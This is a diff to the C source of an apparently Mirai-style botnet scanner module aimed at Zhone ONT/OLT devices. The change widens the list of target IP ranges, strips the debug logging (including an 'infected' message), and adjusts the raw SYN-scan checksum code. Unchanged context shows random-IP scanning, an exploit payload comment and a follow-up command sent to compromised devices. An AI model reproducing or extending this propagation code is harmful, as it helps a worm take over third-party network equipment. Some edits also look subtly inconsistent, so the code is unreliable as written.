@@ -2,9 +2,6 @@
 
 #define _GNU_SOURCE
 
-#ifdef DEBUG
-    #include <stdio.h>
-#endif
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -16,8 +13,9 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 
 #include "includes.h"
 #include "zhone.h"
@@ -32,7 +30,7 @@ struct zhone_scanner_auth *zhone_auth_table = NULL;
 struct zhone_scanner_connection *conn_table;
 uint16_t zhone_zhone_auth_table_max_weight = 0;
 uint32_t zhone_fake_time = 0;
-int zhone_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73};
+int zhone_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73,46,47,48,49,50,51,52,58,59,60,61,104,105,106,107,108,109,110,111,112,113,114,115,117,119,120,121,122,123,124,125,175,176,178,181,182,183,184,185,186,188};
 
 /* Zhone exploit payloads - targets Zhone ONT/OLT devices */
 static char *zhone_payload_cmd = 
@@ -100,18 +98,12 @@ void zhone_scanner_init(void)
     // Set up raw socket scanning and payload
     if((zhone_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-        #ifdef DEBUG
-            printf("[zhone] failed to initialize raw socket, cannot scan\n");
-        #endif
         exit(0);
     }
     fcntl(zhone_rsck, F_SETFL, O_NONBLOCK | fcntl(zhone_rsck, F_GETFL, 0));
     i = 1;
     if(setsockopt(zhone_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
     {
-        #ifdef DEBUG
-            printf("[zhone] failed to set IP_HDRINCL, cannot scan\n");
-        #endif
         close(zhone_rsck);
         exit(0);
     }
@@ -141,13 +133,14 @@ void zhone_scanner_init(void)
     tcph->doff = 5;
     tcph->syn = TRUE;
     tcph->window = rand_next() & 0xFFFF;
-    tcph->check = checksum((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt));
+    tcph->check = checksum_generic((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt) / 2);
 
     // Start scanner loop
     while(TRUE)
     {
         fd_set fdset;
         struct timeval timeo;
+        struct sockaddr_in paddr;
         int mfd = 0, nfds;
 
         FD_ZERO(&fdset);
@@ -170,9 +163,6 @@ void zhone_scanner_init(void)
         nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
         if(nfds == -1)
         {
-            #ifdef DEBUG
-                printf("[zhone] select failed\n");
-            #endif
             break;
         }
         else if(nfds == 0)
@@ -187,11 +177,11 @@ void zhone_scanner_init(void)
                 iph->id = rand_next();
                 iph->daddr = get_random_zhone_ip();
                 iph->check = 0;
-                iph->check = checksum((uint16_t *)iph, sizeof(struct iphdr));
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
 
                 tcph->seq = rand_next();
                 tcph->check = 0;
-                tcph->check = checksum((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt));
+                tcph->check = checksum_generic((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt) / 2);
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -282,21 +272,9 @@ void zhone_scanner_init(void)
                                 conn->dst_addr & 0xFF);
 
                             send(conn->fd, secondary_cmd, strlen(secondary_cmd), MSG_NOSIGNAL);
-
-                            #ifdef DEBUG
-                                printf("[zhone] Successfully infected Zhone device %d.%d.%d.%d\n",
-                                    (conn->dst_addr >> 24) & 0xFF,
-                                    (conn->dst_addr >> 16) & 0xFF,
-                                    (conn->dst_addr >> 8) & 0xFF,
-                                    conn->dst_addr & 0xFF);
-                            #endif
-
                             conn->state = ZHONE_SC_CLOSED;
                         }
-                        else
-                        {
-                            conn->state = ZHONE_SC_CLOSED;
-                        }
+                        conn->state = ZHONE_SC_CLOSED;
                     }
                 }
 
